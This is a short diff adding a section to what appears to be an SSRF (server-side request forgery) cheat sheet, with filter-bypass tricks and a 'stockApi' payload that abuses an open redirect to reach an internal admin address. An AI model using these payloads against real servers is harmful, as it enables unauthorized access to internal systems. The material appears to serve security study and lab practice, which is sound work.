@@ -194,3 +194,8 @@ http://017700000001/%2561dmin
 3 - https://expected-host.evil-host
 4 - URL-encode characters to confuse the URL-parsing code
 ```
+
+### Bypassing SSRF filters via open redirection
+```
+stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
+```
